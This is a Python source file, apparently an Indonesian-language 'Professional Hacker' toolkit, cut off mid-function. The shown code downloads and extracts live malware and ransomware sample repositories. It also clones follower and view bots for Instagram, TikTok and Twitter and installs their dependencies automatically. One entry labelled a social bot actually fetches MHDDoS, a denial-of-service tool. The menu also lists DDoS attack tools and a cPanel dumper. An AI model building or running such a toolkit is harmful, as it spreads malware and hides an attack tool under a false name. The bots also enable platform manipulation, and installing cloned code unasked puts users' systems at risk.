#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pro Tools - Advanced Website Security Scanner
Custom-built for Termux/Linux with accurate detection
This app was developed by Dwi Bakti N Dev
"""

import os
import sys
import time
import socket
import requests
import threading
import random
import json
from urllib.parse import urljoin, urlparse, quote
import dns.resolver
import ssl
import subprocess
import re
import concurrent.futures
from tqdm import tqdm
import requests
from urllib.parse import urljoin
import json
from tabulate import tabulate
import struct
import subprocess
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import traceback
from datetime import datetime
from urllib.parse import parse_qs
from urllib.parse import urlencode
import concurrent.futures
import zipfile

# Warna untuk UI yang lebih lengkap
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    ORANGE = '\033[38;5;208m'
    PURPLE = '\033[38;5;129m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class Animations:
    @staticmethod
    def loading_animation(text="Loading", duration=2):
        chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        start_time = time.time()
        i = 0
        while time.time() - start_time < duration:
            print(f"\r{Colors.CYAN}{chars[i % len(chars)]} {text}{Colors.END}", end="", flush=True)
            time.sleep(0.1)
            i += 1
        print("\r" + " " * (len(text) + 10) + "\r", end="", flush=True)

    @staticmethod
    def progress_bar(iterable, desc="Processing"):
        return tqdm(iterable, desc=f"{Colors.CYAN}{desc}{Colors.END}", 
                   bar_format="{l_bar}%s{bar}%s{r_bar}" % (Colors.CYAN, Colors.END))

    @staticmethod
    def typewriter(text, delay=0.03):
        for char in text:
            print(char, end='', flush=True)
            time.sleep(delay)
        print()

    @staticmethod
    def scan_animation():
        symbols = ["[■□□□□□□□□□]", "[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", 
                  "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", 
                  "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
        for i in range(3):
            for symbol in symbols:
                print(f"\r{Colors.YELLOW}Scanning {symbol}{Colors.END}", end="", flush=True)
                time.sleep(0.1)
        print("\r" + " " * 20 + "\r", end="", flush=True)

class AlatBantuPro:
    def __init__(self):
        self.target_url = ""
        self.results = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.vulnerabilities_found = []
        self.scan_start_time = None

    def clear_screen(self):
        os.system('clear')

    def show_ascii_art(self):
        ascii_art = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════╗
║                              ▒░░░                ║
║                             ░▒▒░░                ║
║                            ▒▒▒▒░░                ║
║              ▒▒░░▒   ▒░░░░▒▒▒▒▒░▒                ║
║            ░░░░░░▒▒░░░░░░░░░▒▒▒▒                 ║
║        ▒░░░░▒▒▒▒▒░░░░░░░░░░░░░▒▒▒                ║
║          ▒▒▓   ▒░▒░░▓▓▓▓▓▒░░░░░░▒▒               ║
║               ▓░░░▓▓▓▓▒▓▓▓▓▓░░░░░▒               ║
║               ▒░▒▓▓▒▓▓▓▓▓▒▓▓▓▒░░░░▒              ║
║               ░░▓▓▒░▒▓▒▒▒▒▒▒▓▓▒░░░▒              ║
║              ▒░▒▓▒▓░█░░░░▒█▓▓▓▓░░░▒▒             ║
║              ▒░▒▓▓▒░░░░░░░░▒▓▓▓▓░░▒▒             ║
║              ▒░▓▓▓▓░░░░░░░░▒▓▓▓░▒▒▒▓             ║
║               ▒▓▓▓▓▒▒▒▒░░▒▓▓▓▓▒▒░░░▒             ║         
║                                                  ║
║        █░█ ▄▀█ █▀▀ █▄▀ █▀▀ █▀█ █▀█ █▀▀ █▀▀       ║
║        █▀█ █▀█ █▄▄ █░█ █▀░ █▄█ █▀▄ █▄█ ██▄       ║
║                                                  ║
║            PROFESSIONAL Hacker V2.8.7            ║
║            Created by Dwi Bakti N Dev            ║
╚══════════════════════════════════════════════════╝
{Colors.END}
"""
        print(ascii_art)

    def banner(self):
        self.clear_screen()
        self.show_ascii_art()

    def print_banner_section(self, title):
        print(f"\n{Colors.YELLOW}{Colors.BOLD}╔{'═' * 60}╗{Colors.END}")
        print(f"{Colors.YELLOW}{Colors.BOLD}║ {title.center(58)} ║{Colors.END}")
        print(f"{Colors.YELLOW}{Colors.BOLD}╚{'═' * 60}╝{Colors.END}")

    def print_result(self, title, result, status="info", indent=0):
        colors = {
            "info": Colors.BLUE,
            "success": Colors.GREEN,
            "warning": Colors.YELLOW,
            "error": Colors.RED,
            "critical": Colors.RED + Colors.BOLD,
            "vulnerability": Colors.ORANGE
        }
        indent_str = "  " * indent
        status_icon = {
            "info": "ℹ",
            "success": "✓",
            "warning": "⚠",
            "error": "✗",
            "critical": "💀",
            "vulnerability": "⚡"
        }
        print(f"{indent_str}{colors[status]}{status_icon[status]} {title}: {result}{Colors.END}")

    def log_vulnerability(self, type_, details, severity="MEDIUM"):
        self.vulnerabilities_found.append({
            "type": type_,
            "details": details,
            "severity": severity,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        self.print_result(f"{type_} Vulnerability", details, "vulnerability", 1)

    def menu_utama(self):
        while True:
            self.banner()
            
            print(f"{Colors.CYAN}{Colors.BOLD}Menu Utama:{Colors.END}")
            print(f"{Colors.GREEN}1.{Colors.END}  Scan Keamanan Website Lengkap")
            print(f"{Colors.GREEN}2.{Colors.END}  Cek Kerentanan SQL Injection (Advanced)")
            print(f"{Colors.GREEN}3.{Colors.END}  Cek Kerentanan XSS (Advanced)")
            print(f"{Colors.GREEN}4.{Colors.END}  Port Scanner (Comprehensive)")
            print(f"{Colors.GREEN}5.{Colors.END}  DNS Lookup & WHOIS (Detailed)")
            print(f"{Colors.GREEN}6.{Colors.END}  SSL/TLS Checker (Deep Analysis)")
            print(f"{Colors.GREEN}7.{Colors.END}  Directory & File Bruteforce")
            print(f"{Colors.GREEN}8.{Colors.END}  Subdomain Scanner (Massive)")
            print(f"{Colors.GREEN}9.{Colors.END}  Header Security Check (Complete)")
            print(f"{Colors.GREEN}10.{Colors.END} CMS & Technology Detection")
            print(f"{Colors.GREEN}11.{Colors.END} Vulnerability Report")
            print(f"{Colors.GREEN}12.{Colors.END} View Source Code (Complete Analysis)")
            print(f"{Colors.GREEN}13.{Colors.END} Backend & PHP Analysis")
            print(f"{Colors.GREEN}14.{Colors.END} cPanel Project Dumper")
            print(f"{Colors.GREEN}15.{Colors.END} DDoS Attack Tools (Complete)")
            print(f"{Colors.GREEN}16.{Colors.END} Install Hacking Tools (Complete Collection)")
            print(f"{Colors.GREEN}17.{Colors.END} Run Installed Tools")
            print(f"{Colors.GREEN}18.{Colors.END} Download Virus Collection (GitHub)")
            print(f"{Colors.GREEN}19.{Colors.END} Social Media Tools (Followers/Views)")
            print(f"{Colors.GREEN}20.{Colors.END} Settings & Configuration")
            print(f"{Colors.GREEN}21.{Colors.END} About & Help")
            print(f"{Colors.GREEN}0.{Colors.END}  Keluar")
            
            pilihan = input(f"\n{Colors.CYAN}➤ Pilih menu [0-21]: {Colors.END}").strip()
            
            menu_functions = {
                "1": self.scan_lengkap,
                "2": self.sql_injection_scan_advanced,
                "3": self.xss_scan_advanced,
                "4": self.port_scanner_comprehensive,
                "5": self.dns_whois_lookup_detailed,
                "6": self.ssl_checker_deep,
                "7": self.directory_file_bruteforce,
                "8": self.subdomain_scanner_massive,
                "9": self.header_security_check_complete,
                "10": self.cms_technology_detection,
                "11": self.vulnerability_report,
                "12": self.view_source_code_complete_analysis,
                "13": self.backend_php_analysis,
                "14": self.cpanel_project_dumper,
                "15": self.ddos_attack_tools,
                "16": self.install_hacking_tools,
                "17": self.run_installed_tools,
                "18": self.download_virus_collection,
                "19": self.social_media_tools,
                "20": self.settings_configuration,
                "21": self.about_help
            }
            
            if pilihan in menu_functions:
                menu_functions[pilihan]()
            elif pilihan == "0":
                self.exit_program()
            else:
                self.print_result("Error", "Pilihan tidak valid!", "error")
                input(f"\n{Colors.CYAN}Tekan Enter untuk melanjutkan...{Colors.END}")

    def download_virus_collection(self):
        """Download virus collection from GitHub repositories dengan lebih banyak opsi"""
        try:
            self.print_result("Info", "Memulai download koleksi virus dari GitHub...", "info")
            
            # Daftar lengkap repositori malware/virus
            virus_repos = [
                {"name": "MalwareDatabase", "url": "https://github.com/malwares/MalwareDatabase", "type": "malware"},
                {"name": "theZoo", "url": "https://github.com/ytisf/theZoo", "type": "malware"},
                {"name": "awesome-malware-analysis", "url": "https://github.com/rshipp/awesome-malware-analysis", "type": "analysis"},
                {"name": "Awesome-Malware-Analysis", "url": "https://github.com/ashishpatel26/Awesome-Malware-Analysis", "type": "analysis"},
                {"name": "Malware-Sample-Sources", "url": "https://github.com/fabrimagic72/malware-samples", "type": "malware"},
                {"name": "VirusShare", "url": "https://github.com/VirusShare/virusshare", "type": "malware"},
                {"name": "MalwareBazaar", "url": "https://github.com/MalwareBazaar/bazaar", "type": "malware"},
                {"name": "Hybrid-Analysis", "url": "https://github.com/PayloadSecurity/HybridAnalysis", "type": "analysis"},
                {"name": "MalwareTrafficAnalysis", "url": "https://github.com/malware-traffic-analysis/net", "type": "analysis"},
                {"name": "Ransomware-Samples", "url": "https://github.com/jstrosch/malware-samples", "type": "ransomware"},
                {"name": "Android-Malware", "url": "https://github.com/ashishb/android-malware", "type": "android"},
                {"name": "MacOS-Malware", "url": "https://github.com/objective-see/Malware", "type": "macos"},
                {"name": "Linux-Malware", "url": "https://github.com/m0nad/Linux-Malware", "type": "linux"},
                {"name": "IoCs", "url": "https://github.com/fireeye/iocs", "type": "ioc"},
                {"name": "Malware-IoC", "url": "https://github.com/sophos-ai/malware-ioc", "type": "ioc"}
            ]
            
            while True:
                print(f"\n{Colors.YELLOW}=== DOWNLOAD VIRUS COLLECTION ==={Colors.END}")
                print(f"{Colors.YELLOW}Repository Virus yang tersedia:{Colors.END}")
                
                # Group repos by type
                malware_repos = [r for r in virus_repos if r["type"] == "malware"]
                analysis_repos = [r for r in virus_repos if r["type"] == "analysis"]
                specialized_repos = [r for r in virus_repos if r["type"] not in ["malware", "analysis"]]
                
                print(f"\n{Colors.GREEN}🎯 MALWARE SAMPLES:{Colors.END}")
                for i, repo in enumerate(malware_repos, 1):
                    print(f"{Colors.GREEN}{i}.{Colors.END} {repo['name']} - {repo['url']}")
                
                print(f"\n{Colors.BLUE}🔍 ANALYSIS TOOLS & DATA:{Colors.END}")
                for i, repo in enumerate(analysis_repos, len(malware_repos)+1):
                    print(f"{Colors.BLUE}{i}.{Colors.END} {repo['name']} - {repo['url']}")
                
                print(f"\n{Colors.CYAN}📱 SPECIALIZED MALWARE:{Colors.END}")
                for i, repo in enumerate(specialized_repos, len(malware_repos)+len(analysis_repos)+1):
                    print(f"{Colors.CYAN}{i}.{Colors.END} {repo['name']} - {repo['url']}")
                
                print(f"\n{Colors.MAGENTA}{len(virus_repos)+1}. Custom GitHub URL{Colors.END}")
                print(f"{Colors.MAGENTA}{len(virus_repos)+2}. Download Multiple Repositories{Colors.END}")
                
                print(f"\n{Colors.RED}⚠️  PERINGATAN KEAMANAN:{Colors.END}")
                print(f"{Colors.RED}• File virus dapat merusak sistem secara permanen{Colors.END}")
                print(f"{Colors.RED}• Gunakan HANYA untuk penelitian keamanan{Colors.END}")
                print(f"{Colors.RED}• Jalankan di environment terisolasi (VM/Sandbox){Colors.END}")
                print(f"{Colors.RED}• Hindari eksekusi file yang didownload{Colors.END}")
                print(f"{Colors.RED}• Backup data penting sebelum melanjutkan{Colors.END}")
                
                choice = input(f"\n{Colors.CYAN}Pilih repository [1-{len(virus_repos)+2}] atau 'q' untuk keluar: {Colors.END}").strip().lower()
                
                if choice == 'q':
                    break
                
                if choice == str(len(virus_repos)+1):
                    # Custom URL
                    custom_url = input(f"{Colors.CYAN}Masukkan GitHub URL: {Colors.END}").strip()
                    if self.validate_github_url(custom_url):
                        self.download_from_repo(custom_url, "Custom Repository")
                    else:
                        self.print_result("Error", "URL GitHub tidak valid!", "error")
                
                elif choice == str(len(virus_repos)+2):
                    # Multiple downloads
                    self.download_multiple_repos(virus_repos)
                
                elif choice.isdigit() and 1 <= int(choice) <= len(virus_repos):
                    selected_repo = virus_repos[int(choice)-1]
                    self.download_from_repo(selected_repo["url"], selected_repo["name"])
                
                else:
                    self.print_result("Error", "Pilihan tidak valid!", "error")
                
                continue_download = input(f"\n{Colors.CYAN}Download lainnya? (y/N): {Colors.END}").strip().lower()
                if continue_download != 'y':
                    break
                    
        except Exception as e:
            self.print_result("Error", f"Terjadi kesalahan: {str(e)}", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk melanjutkan...{Colors.END}")

    def download_from_repo(self, repo_url, repo_name):
        """Download dari repository GitHub tertentu"""
        try:
            self.print_result("Info", f"Memulai download dari: {repo_name}", "info")
            self.print_result("Info", f"URL: {repo_url}", "info")
            
            # Extract owner and repo name from URL
            parsed_url = urlparse(repo_url)
            path_parts = parsed_url.path.strip('/').split('/')
            
            if len(path_parts) < 2:
                self.print_result("Error", "URL GitHub tidak valid!", "error")
                return
            
            owner, repo = path_parts[0], path_parts[1]
            
            # Pilihan download method
            print(f"\n{Colors.YELLOW}Metode Download:{Colors.END}")
            print(f"{Colors.GREEN}1.{Colors.END} Download as ZIP (Recommended)")
            print(f"{Colors.GREEN}2.{Colors.END} Clone with Git")
            print(f"{Colors.GREEN}3.{Colors.END} Download specific branch")
            
            method_choice = input(f"{Colors.CYAN}Pilih metode [1-3]: {Colors.END}").strip()
            
            if method_choice == '1':
                self.download_github_zip(owner, repo, repo_name)
            elif method_choice == '2':
                self.clone_github_repo(repo_url, repo_name)
            elif method_choice == '3':
                branch = input(f"{Colors.CYAN}Masukkan nama branch (default: main): {Colors.END}").strip()
                if not branch:
                    branch = "main"
                self.download_github_branch(owner, repo, branch, repo_name)
            else:
                self.print_result("Error", "Pilihan metode tidak valid!", "error")
                
        except Exception as e:
            self.print_result("Error", f"Gagal download: {str(e)}", "error")

    def download_github_zip(self, owner, repo, repo_name):
        """Download repository sebagai ZIP"""
        download_url = f"https://github.com/{owner}/{repo}/archive/refs/heads/main.zip"
        
        # Coba main branch dulu, lalu master
        try:
            response = requests.head(download_url)
            if response.status_code != 200:
                download_url = f"https://github.com/{owner}/{repo}/archive/refs/heads/master.zip"
        except:
            download_url = f"https://github.com/{owner}/{repo}/archive/refs/heads/master.zip"
        
        download_dir = "virus_collection"
        os.makedirs(download_dir, exist_ok=True)
        
        zip_filename = os.path.join(download_dir, f"{repo_name}.zip")
        
        try:
            self.print_result("Info", "Memulai download...", "info")
            
            response = requests.get(download_url, stream=True)
            response.raise_for_status()
            
            total_size = int(response.headers.get('content-length', 0))
            downloaded_size = 0
            
            with open(zip_filename, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
                        downloaded_size += len(chunk)
                        
                        # Progress bar
                        if total_size > 0:
                            progress = (downloaded_size / total_size) * 100
                            print(f"{Colors.YELLOW}Download progress: {progress:.1f}% ({downloaded_size}/{total_size} bytes){Colors.END}", end='\r')
            
            print()  # New line after progress
            
            # Extract ZIP file
            self.print_result("Info", "Mengekstrak file...", "info")
            with zipfile.ZipFile(zip_filename, 'r') as zip_ref:
                zip_ref.extractall(download_dir)
            
            # Cleanup ZIP file
            os.remove(zip_filename)
            
            self.print_result("Success", f"Download completed! File disimpan di '{download_dir}/{repo_name}'", "success")
            
        except Exception as e:
            self.print_result("Error", f"Download gagal: {str(e)}", "error")

    def clone_github_repo(self, repo_url, repo_name):
        """Clone repository menggunakan Git"""
        try:
            import subprocess
            
            download_dir = "virus_collection"
            os.makedirs(download_dir, exist_ok=True)
            
            repo_dir = os.path.join(download_dir, repo_name)
            
            if os.path.exists(repo_dir):
                overwrite = input(f"{Colors.YELLOW}Directory sudah ada. Overwrite? (y/N): {Colors.END}").strip().lower()
                if overwrite != 'y':
                    return
            
            self.print_result("Info", "Cloning repository...", "info")
            
            result = subprocess.run(
                ['git', 'clone', '--depth', '1', repo_url, repo_dir],
                capture_output=True,
                text=True,
                timeout=300  # 5 minutes timeout
            )
            
            if result.returncode == 0:
                self.print_result("Success", f"Clone completed! Repository disimpan di '{repo_dir}'", "success")
            else:
                self.print_result("Error", f"Clone gagal: {result.stderr}", "error")
                
        except subprocess.TimeoutExpired:
            self.print_result("Error", "Clone timeout! Repository terlalu besar.", "error")
        except Exception as e:
            self.print_result("Error", f"Clone gagal: {str(e)}", "error")

    def download_multiple_repos(self, virus_repos):
        """Download multiple repositories sekaligus"""
        try:
            print(f"\n{Colors.YELLOW}=== MULTIPLE REPOSITORY DOWNLOAD ==={Colors.END}")
            print(f"{Colors.CYAN}Pilih repositories untuk didownload (contoh: 1,3,5-8): {Colors.END}")
            
            selection = input(f"{Colors.CYAN}Masukkan pilihan: {Colors.END}").strip()
            
            selected_indices = self.parse_selection(selection, len(virus_repos))
            
            if not selected_indices:
                self.print_result("Error", "Tidak ada repository yang dipilih!", "error")
                return
            
            print(f"\n{Colors.YELLOW}Repositories yang akan didownload:{Colors.END}")
            for idx in selected_indices:
                repo = virus_repos[idx-1]
                print(f"{Colors.GREEN}•{Colors.END} {repo['name']} - {repo['url']}")
            
            confirm = input(f"\n{Colors.RED}Konfirmasi download {len(selected_indices)} repositories? (y/N): {Colors.END}").strip().lower()
            
            if confirm == 'y':
                self.print_result("Info", f"Memulai parallel download {len(selected_indices)} repositories...", "info")
                
                with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                    futures = []
                    for idx in selected_indices:
                        repo = virus_repos[idx-1]
                        future = executor.submit(self.download_from_repo, repo["url"], repo["name"])
                        futures.append(future)
                    
                    # Wait for all downloads to complete
                    for future in concurrent.futures.as_completed(futures):
                        try:
                            future.result()
                        except Exception as e:
                            self.print_result("Error", f"Download gagal: {str(e)}", "error")
                
                self.print_result("Success", "Semua download selesai!", "success")
                
        except Exception as e:
            self.print_result("Error", f"Multiple download gagal: {str(e)}", "error")

    def parse_selection(self, selection, max_range):
        """Parse selection string seperti '1,3,5-8' menjadi list of indices"""
        try:
            selected_indices = set()
            parts = selection.split(',')
            
            for part in parts:
                part = part.strip()
                if '-' in part:
                    start, end = part.split('-')
                    start, end = int(start.strip()), int(end.strip())
                    selected_indices.update(range(start, end + 1))
                else:
                    selected_indices.add(int(part))
            
            # Filter valid indices
            valid_indices = [idx for idx in selected_indices if 1 <= idx <= max_range]
            return sorted(valid_indices)
            
        except:
            return []

    def validate_github_url(self, url):
        """Validasi URL GitHub"""
        try:
            parsed = urlparse(url)
            return parsed.netloc == 'github.com' and len(parsed.path.strip('/').split('/')) >= 2
        except:
            return False

    def download_github_branch(self, owner, repo, branch, repo_name):
        """Download specific branch"""
        download_url = f"https://github.com/{owner}/{repo}/archive/refs/heads/{branch}.zip"
        
        download_dir = "virus_collection"
        os.makedirs(download_dir, exist_ok=True)
        
        zip_filename = os.path.join(download_dir, f"{repo_name}_{branch}.zip")
        
        try:
            self.print_result("Info", f"Download branch '{branch}'...", "info")
            
            response = requests.get(download_url, stream=True)
            
            if response.status_code != 200:
                self.print_result("Error", f"Branch '{branch}' tidak ditemukan!", "error")
                return
            
            with open(zip_filename, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
            
            # Extract ZIP file
            with zipfile.ZipFile(zip_filename, 'r') as zip_ref:
                zip_ref.extractall(download_dir)
            
            os.remove(zip_filename)
            
            self.print_result("Success", f"Download branch '{branch}' completed!", "success")
            
        except Exception as e:
            self.print_result("Error", f"Download branch gagal: {str(e)}", "error")

    def social_media_tools(self):
        """Download social media tools from GitHub repositories"""
        self.print_result("Info", "Download Social Media Tools dari GitHub...", "info")
        
        # Daftar repository GitHub yang masih aktif dan terupdate
        social_tools_repos = [
            {
                "name": "HeyReal - Followers Tool",
                "url": "https://github.com/Royhtml/Followers-HeyReal",
                "description": "Instagram followers automation tool"
            },
            {
                "name": "Instagram Bot - instabot",
                "url": "https://github.com/instabot-py/instabot.py",
                "description": "Instagram bot untuk followers, likes, comments"
            },
            {
                "name": "InstaPy - Instagram Bot",
                "url": "https://github.com/InstaPy/InstaPy",
                "description": "Instagram Automation Tool"
            },
            {
                "name": "Instagram Tool - instapy-cli",
                "url": "https://github.com/instagrambot/instapy-cli",
                "description": "Tool Instagram automation"
            },
            {
                "name": "YouTube Bot - youtube-bot",
                "url": "https://github.com/ai-robots-txt/youtube-bot",
                "description": "Bot untuk subscribers dan views YouTube"
            },
            {
                "name": "TikTok Bot - tiktok-bot",
                "url": "https://github.com/sauermar/TikTok-Bot",
                "description": "Automation tools untuk TikTok"
            },
            {
                "name": "TikTokBot - TikTok Automation",
                "url": "https://github.com/TikTokBot/TikTokBot",
                "description": "Another TikTok automation tool"
            },
            {
                "name": "Twitter Bot - twitter-bot",
                "url": "https://github.com/rhaymison/TwitterBot",
                "description": "Bot followers dan retweet Twitter"
            },
            {
                "name": "TwitterBot - Advanced",
                "url": "https://github.com/SecOrso/twitter-bot",
                "description": "Advanced Twitter automation"
            },
            {
                "name": "Facebook Bot - facebook-bot",
                "url": "https://github.com/Senpaizuri/Facebook-Bot",
                "description": "Automation untuk Facebook"
            },
            {
                "name": "Social Media Toolkit - socialkit",
                "url": "https://github.com/jofpin/socialkit",
                "description": "Koleksi tools social media"
            },
            {
                "name": "All-in-One Social Bot - socialbot",
                "url": "https://github.com/MatrixTM/MHDDoS",
                "description": "Multi-platform social media tools"
            },
            {
                "name": "SocialBot - Multi Platform",
                "url": "https://github.com/aridev2001/socialbot",
                "description": "Multi-platform social media bot"
            },
            {
                "name": "Instagram Follower Bot",
                "url": "https://github.com/guledenozn/Instagram-Follower-Bot",
                "description": "Instagram follower automation"
            },
            {
                "name": "Auto Instagram Bot",
                "url": "https://github.com/ohidurbappy/auto-instagram-bot",
                "description": "Auto Instagram bot with selenium"
            }
        ]
        
        print(f"\n{getattr(Colors, 'YELLOW', '')}📱 Available Social Media Tools:{getattr(Colors, 'END', '')}")
        print(f"{getattr(Colors, 'CYAN', '')}{'No.':<3} {'Tool Name':<35} {'Description'}{getattr(Colors, 'END', '')}")
        print("-" * 80)
        
        for i, tool in enumerate(social_tools_repos, 1):
            print(f"{getattr(Colors, 'GREEN', '')}{i:<3}{getattr(Colors, 'END', '')} {tool['name']:<35} {tool['description']}")
        
        print(f"\n{getattr(Colors, 'YELLOW', '')}📂 Semua tools akan di-download ke folder 'social_tools/'{getattr(Colors, 'END', '')}")
        print(f"{getattr(Colors, 'YELLOW', '')}⚠️  Pastikan Anda menggunakan tools ini secara bertanggung jawab!{getattr(Colors, 'END', '')}")
        
        try:
            choice = input(f"\n{getattr(Colors, 'CYAN', '')}➤ Pilih tools (0 untuk semua, 1-{len(social_tools_repos)} untuk spesifik, 'c' untuk custom): {getattr(Colors, 'END', '')}").strip().lower()
            
            if choice == '0':
                # Download semua tools
                self.print_result("Info", f"Download semua {len(social_tools_repos)} tools...", "info")
                self._download_multiple_tools(social_tools_repos)
                
            elif choice.isdigit() and 1 <= int(choice) <= len(social_tools_repos):
                # Download tool spesifik
                selected_tool = social_tools_repos[int(choice) - 1]
                self._download_single_tool(selected_tool)
                
            elif choice == 'c':
                # Custom GitHub repository
                self._download_custom_repo()
                
            else:
                self.print_result("Error", "Pilihan tidak valid!", "error")
                return
                
        except KeyboardInterrupt:
            self.print_result("Info", "Download dibatalkan oleh user", "info")
        except Exception as e:
            self.print_result("Error", f"Terjadi kesalahan: {str(e)}", "error")

    def _download_single_tool(self, tool):
        """Download single GitHub tool"""
        import os
        import subprocess
        import shutil
        
        repo_name = tool['url'].split('/')[-1].replace('.git', '')
        target_dir = f"social_tools/{repo_name}"
        
        print(f"\n{getattr(Colors, 'YELLOW', '')}📥 Download {tool['name']}...{getattr(Colors, 'END', '')}")
        print(f"{getattr(Colors, 'CYAN', '')}Repository: {tool['url']}{getattr(Colors, 'END', '')}")
        
        # Buat folder social_tools jika belum ada
        os.makedirs("social_tools", exist_ok=True)
        
        try:
            # Clone repository menggunakan git
            if os.path.exists(target_dir):
                self.print_result("Warning", f"Folder {repo_name} sudah ada, menghapus...", "warning")
                shutil.rmtree(target_dir)
            
            # Tampilkan progress
            self._simulate_download(f"Mengunduh {tool['name']}")
            
            # Clone repository (implementasi nyata)
            print(f"{getattr(Colors, 'YELLOW', '')}⏳ Cloning repository...{getattr(Colors, 'END', '')}")
            result = subprocess.run(['git', 'clone', '--depth', '1', tool['url'], target_dir], 
                                capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                self.print_result("Success", f"Berhasil download {tool['name']}!", "success")
                
                # Cek requirements.txt dan install dependencies
                self._install_dependencies(target_dir)
                
                print(f"{getattr(Colors, 'GREEN', '')}📍 Lokasi: {target_dir}{getattr(Colors, 'END', '')}")
                
                # Tampilkan instruksi penggunaan
                self._show_usage_instructions(target_dir, tool['name'])
                
                # Tampilkan catatan khusus untuk tools tertentu
                self._show_special_notes(tool['name'], target_dir)
                
            else:
                error_msg = result.stderr if result.stderr else "Unknown error"
                self.print_result("Error", f"Gagal download: {error_msg}", "error")
                
        except subprocess.TimeoutExpired:
            self.print_result("Error", "Timeout: Download terlalu lama", "error")
        except Exception as e:
            self.print_result("Error", f"Gagal download: {str(e)}", "error")

    def _download_multiple_tools(self, tools):
        """Download multiple GitHub tools"""
        import os
        import subprocess
        import shutil
        
        self.print_result("Info", f"Memulai download {len(tools)} tools...", "info")
        os.makedirs("social_tools", exist_ok=True)
        
        success_count = 0
        failed_tools = []
        
        for i, tool in enumerate(tools, 1):
            print(f"\n{getattr(Colors, 'CYAN', '')}[{i}/{len(tools)}] {tool['name']}{getattr(Colors, 'END', '')}")
            
            repo_name = tool['url'].split('/')[-1].replace('.git', '')
            target_dir = f"social_tools/{repo_name}"
            
            try:
                # Hapus folder jika sudah ada
                if os.path.exists(target_dir):
                    shutil.rmtree(target_dir)
                
                # Clone repository dengan depth 1 untuk lebih cepat
                result = subprocess.run(['git', 'clone', '--depth', '1', tool['url'], target_dir], 
                                    capture_output=True, text=True, timeout=300)
                
                if result.returncode == 0:
                    success_count += 1
                    print(f"{getattr(Colors, 'GREEN', '')}✓ Berhasil download {tool['name']}{getattr(Colors, 'END', '')}")
                    
                    # Install dependencies
                    self._install_dependencies(target_dir)
                    
                    # Tampilkan catatan khusus
                    self._show_special_notes(tool['name'], target_dir)
                else:
                    failed_tools.append(tool['name'])
                    print(f"{getattr(Colors, 'RED', '')}✗ Gagal download {tool['name']}{getattr(Colors, 'END', '')}")
            
            except subprocess.TimeoutExpired:
                failed_tools.append(tool['name'])
                print(f"{getattr(Colors, 'RED', '')}✗ Timeout: {tool['name']}{getattr(Colors, 'END', '')}")
            except Exception as e:
                failed_tools.append(tool['name'])
                print(f"{getattr(Colors, 'RED', '')}✗ Error: {str(e)}{getattr(Colors, 'END', '')}")
        
        # Tampilkan summary
        self.print_result("Success", f"Download selesai! {success_count}/{len(tools)} tools berhasil", "success")
        if failed_tools:
            print(f"{getattr(Colors, 'YELLOW', '')}Tools yang gagal: {', '.join(failed_tools)}{getattr(Colors, 'END', '')}")

    def _show_special_notes(self, tool_name, target_dir):
        """Tampilkan catatan khusus untuk tools tertentu"""
        special_notes = {
            "HeyReal - Followers Tool": [
                f"{getattr(Colors, 'YELLOW', '')}📝 Catatan untuk HeyReal:{getattr(Colors, 'END', '')}",
                f"{getattr(Colors, 'CYAN', '')}• Tool ini khusus untuk Instagram followers",
                "• Pastikan menggunakan akun burner/sementara",
                "• Gunakan dengan bijak untuk menghindari banned",
                f"• Cek file config di {target_dir} untuk pengaturan{getattr(Colors, 'END', '')}"
            ],
            "InstaPy - Instagram Bot": [
                f"{getattr(Colors, 'YELLOW', '')}📝 Catatan untuk InstaPy:{getattr(Colors, 'END', '')}",
                f"{getattr(Colors, 'CYAN', '')}• Tool yang sangat populer untuk Instagram automation",
                "• Memerlukan setup Chrome/WebDriver",
                "• Baca dokumentasi lengkap di GitHub repository",
                f"• Contoh penggunaan ada di folder examples/{getattr(Colors, 'END', '')}"
            ],
            "Instagram Bot - instabot": [
                f"{getattr(Colors, 'YELLOW', '')}📝 Catatan untuk instabot:{getattr(Colors, 'END', '')}",
                f"{getattr(Colors, 'CYAN', '')}• Library Python untuk Instagram bot",
                "• Gunakan dengan delay yang wajar",
                "• Recommended untuk bot yang sederhana",
                f"• Lihat contoh di folder examples/{getattr(Colors, 'END', '')}"
            ]
        }
        
        if tool_name in special_notes:
            print()
            for note in special_notes[tool_name]:
                print(note)

    def _install_dependencies(self, target_dir):
        """Install dependencies dari requirements.txt"""
        import os
        import subprocess
        
        requirements_files = [
            "requirements.txt",
            "requirements-dev.txt", 
            "setup.py",
            "Pipfile",
            "pyproject.toml"
        ]
        
        for req_file in requirements_files:
            req_path = os.path.join(target_dir, req_file)
            if os.path.exists(req_path):
                print(f"{getattr(Colors, 'YELLOW', '')}📦 Installing dependencies dari {req_file}...{getattr(Colors, 'END', '')}")
                
                try:
                    if req_file == "requirements.txt" or req_file == "requirements-dev.txt":
                        result = subprocess.run(['pip', 'install', '-r', req_path], 
                                            capture_output=True, text=True, timeout=120)
                    elif req_file == "setup.py":
                        result = subprocess.run(['pip', 'install', '-e', target_dir], 
                                            capture_output=True, text=True, timeout=120)
                    elif req_file == "Pipfile":
